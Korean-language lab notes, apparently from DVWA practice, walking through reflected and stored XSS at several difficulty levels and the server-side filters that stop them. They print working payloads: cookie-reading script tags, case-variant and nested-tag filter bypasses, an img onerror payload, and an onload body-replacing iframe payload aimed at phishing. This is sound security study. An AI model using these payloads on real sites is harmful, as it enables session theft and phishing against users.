![[Pasted image 20241008150628.png]]
- 1회성(반사형) 스크립트
![[Pasted image 20241008150827.png]]
- 입력 받은 문자열을 새로운 문자열 생성

```
<script>alert(document.cookie)</script>
```
![[Pasted image 20241008151019.png]]
![[Pasted image 20241008151154.png]]
- 받은 입력을 name 에 저장하고 비엇는지만 검사하고 비지 않았다면 출력

medium
![[Pasted image 20241008151337.png]]
![[Pasted image 20241008151403.png]]
- `<script>`를 공백으로 바꿔줌으로 방어
- 소문자 스크립트 또는 변형된 스트립트는 적용된다.
```
<sCript>alert(document.cookie)</script>
```
![[Pasted image 20241008151617.png]]
```
<sc<script>ript>alert(document.cookie)</script>
```

hight
![[Pasted image 20241008151739.png]]
![[Pasted image 20241008151755.png]]
- 단일 문자는 전부 공백(대소문자 관계없이)으로 preg_replace()로 처리하도록 되어있다.

`<img src=x onerror=prompt()>`
![[Pasted image 20241008152641.png]]

impossible
![[Pasted image 20241008152720.png]]
- htmlspecialchars(): html에 사용되는 모든 특수 문자 삭제
![[Pasted image 20241008152815.png]]


![[Pasted image 20241008150742.png]]
- 다용성(저장형) 스크립트

low
![[Pasted image 20241008153018.png]]
![[Pasted image 20241008153218.png]]
- 개발자 도구로 입력 가능한 텍스트 수를 늘린다.
![[Pasted image 20241008153314.png]]
![[Pasted image 20241008153419.png]]
![[Pasted image 20241008153324.png]]
![[Pasted image 20241008153404.png]]
- 두 필드 모두 xss 취약점이 있다
- 이전에 저장한 스크립트가 먼저 실행된다.
![[Pasted image 20241008153659.png]]

medium
![[Pasted image 20241008154036.png]]
![[Pasted image 20241008153953.png]]![[Pasted image 20241008154102.png]]
- message는 htmlspecialchars()를 통해 특수문자를 일반 문자로 변형했다.
- name필드는 여전히 대소문자/변형외곡/에러 유도에 취약함

high
![[Pasted image 20241008154844.png]]


# iframe?
```
<body topmargin=0 leftmargin=0 onload="document.body.innerHTML='<iframe width=100% height=800 src=http://192.168.56.102/></iframe>',">
```
본문을 로드할 때 상단, 좌측에 배치해서 로드
로드할 때 바디를 HTML을 로드한다.
- 공격자가 만든 피싱 사이트를 연결할 수 있다.
